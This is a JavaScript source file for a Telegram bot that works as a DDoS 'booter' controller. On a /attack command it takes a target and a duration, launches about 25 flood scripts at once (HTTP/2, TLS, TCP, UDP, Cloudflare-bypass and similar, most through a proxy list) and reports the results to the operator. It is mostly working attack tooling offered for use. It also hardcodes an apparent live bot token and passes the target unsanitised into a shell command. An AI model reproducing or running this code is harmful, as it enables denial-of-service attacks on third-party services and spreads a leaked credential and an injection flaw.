const { exec } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = '8054886637:AAHWRyF9MFrbdkzJ9uhcIjZTv64KizBSoqY'; // Replace this with your actual bot token
const bot = new TelegramBot(TOKEN, { polling: true });

const METHODS = [
  ['ninja', 'node ./lib/cache/StarsXNinja.js'],
  ['bypass', 'node methods/bypass.js'],
  ['h2-fast', 'node methods/h2-fast.js'],
  ['httpp-mix', 'node methods/HTTP-GECKO.js'],
  ['pidoras', 'node methods/pidoras.js'],
  ['xyn', 'node methods/xyn.js'],
  ['destroy', 'node methods/destroy.js'],
  ['mix', 'node methods/mix.js'],
  ['gecko', 'node methods/gecko.js'],
  ['api', 'node methods/api.js'],
  ['cf', 'node methods/c-f.js'],
  ['fire', 'node methods/fire.js'],
  ['glory', 'node methods/glory.js'],
  ['h2-meris', 'node methods/H2-MERIS.js'],
  ['browser', 'node methods/browser.js'],
  ['https', 'node methods/https.js'],
  ['h2-flood', 'node methods/H2-FLOOD.js'],
  ['bomb', 'node methods/meriam.js'],
  ['storm', 'node methods/storm.js'],
  ['star', 'node methods/star.js'],
  ['tcp', 'node methods/tcp.js'],
  ['udp', 'node methods/udp.js'],
  ['chap', 'node methods/chap.js'],
  ['tls', 'node methods/tls.js'],
  ['http-flood', 'node methods/http-flod.js'],
];

bot.onText(/\/attack (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split(' ');

  if (args.length < 2) {
    return bot.sendMessage(chatId, '❌ Usage: /attack <target> <time>');
  }

  const target = args[0];
  const time = args[1];
  
  // Send initial confirmation
  const attackMessage = `🚀 Attack launched on target:\n🌐 ${target}\n⏱ Duration: ${time} seconds`;
  bot.sendMessage(chatId, attackMessage);

  let successCount = 0;
  let failureCount = 0;
  const statusMessages = [];

  const handleCompletion = () => {
    if ((successCount + failureCount) === METHODS.length) {
      const summary = `
📊 Attack Summary:
✅ Successful: ${successCount}
❌ Failed: ${failureCount}
🌐 Target: ${target}
⏱ Duration: ${time} seconds
      `;
      bot.sendMessage(chatId, summary);
    }
  };

  METHODS.forEach(([name, command]) => {
    let fullCommand;
    
    // Handle special cases
    if (name === 'cf') {
      fullCommand = `${command} ${target} ${time} 10 8`;
    } else if (name === 'chap') {
      fullCommand = `${command} ${target} ${time} 10 100 proxy.txt`;
    } else if (name === 'ninja') {
      fullCommand = `${command} ${target} ${time}`;
    } else {
      fullCommand = `${command} ${target} ${time} 100 10 proxy.txt`;
    }

    exec(fullCommand, (err) => {
      if (err) {
        failureCount++;
        statusMessages.push(`❌ ${name} failed: ${err.message.slice(0, 100)}`);
      } else {
        successCount++;
        statusMessages.push(`✅ ${name} started successfully`);
      }
      
      // Send batch updates every 5 methods
      if ((successCount + failureCount) % 5 === 0 || 
          (successCount + failureCount) === METHODS.length) {
        const update = statusMessages.splice(0).join('\n');
        bot.sendMessage(chatId, update, { disable_notification: true });
      }
      
      handleCompletion();
    });
  });
});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `🤖 Welcome! Use:\n/attack <target> <time>\nTo launch all methods at once.`);
});

// Error handling
bot.on('polling_error', (error) => {
  console.error(`Polling error: ${error.message}`);
});